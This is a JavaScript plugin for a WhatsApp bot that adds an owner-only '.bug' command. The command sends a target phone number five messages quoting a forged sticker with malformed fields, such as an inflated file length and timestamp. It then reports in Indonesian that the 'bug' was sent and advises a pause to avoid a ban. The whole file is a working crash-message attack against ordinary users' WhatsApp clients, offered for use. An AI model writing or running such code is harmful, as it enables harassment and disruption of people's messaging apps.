let handler = async (m, { conn, text, args, command }) => {
    if (!text) throw `*Example:* .bug 628xxxxxx`
    let fvn = { 
    key: {
    fromMe: false, 
    participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {}) }, 'message': {
     "stickerMessage": {
    "url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
    "fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
    "fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
    "mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
    "mimetype": "image/webp",
    "height": 40,
    "width": 40,
    "directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
    "fileLength": "99999999",
    "mediaKeyTimestamp": "16572901099967",
            'isAnimated': []
    }}}
    let Pe = text.split("|")[0]+'@s.whatsapp.net'
    conn.sendMessage(Pe, {text: 'hhe'}, {quoted: fvn})
    conn.sendMessage(Pe, {text: 'hhe'}, {quoted: fvn})
    conn.sendMessage(Pe, {text: 'hhe'}, {quoted: fvn})
    conn.sendMessage(Pe, {text: 'hhe'}, {quoted: fvn})
    conn.sendMessage(Pe, {text: 'hhe'}, {quoted: fvn})
    conn.sendMessage(m.chat, {
        react: {
          text: '🕒',
          key: m.key,
        }
      });
    let wait = '□'
    const arr = [
        { text: "□■", timeout: 100 },
        { text: "■□", timeout: 150 },
        { text: "□■", timeout: 200 },
        { text: "■□", timeout: 250 },
        { text: "□■", timeout: 300 },
        { text: "■□", timeout: 350 },
        { text: "■■", timeout: 400 },
        { text: `Berhasil Mengirim Bug Ke Nomor ${Pe}, mohon jeda selama 3 menit untuk mengatasi terjadinya banned.`, timeout: 600 }
      ];
    
      const lll = await conn.sendMessage(m.chat, { text: wait }, { quoted: m });
    
      for (let i = 0; i < arr.length; i++) {
        await new Promise(resolve => setTimeout(resolve, arr[i].timeout));
        await conn.relayMessage(m.chat, {
          protocolMessage: {
            key: lll,
            type: 14,
            editedMessage: {
              conversation: arr[i].text
            }
          }
        }, {});
      }
    }
    handler.command = /^(bug)$/i
    handler.owner = true
    handler.tags = ['owner'];
    handler.private = false
    handler.limit = true
    module.exports = handler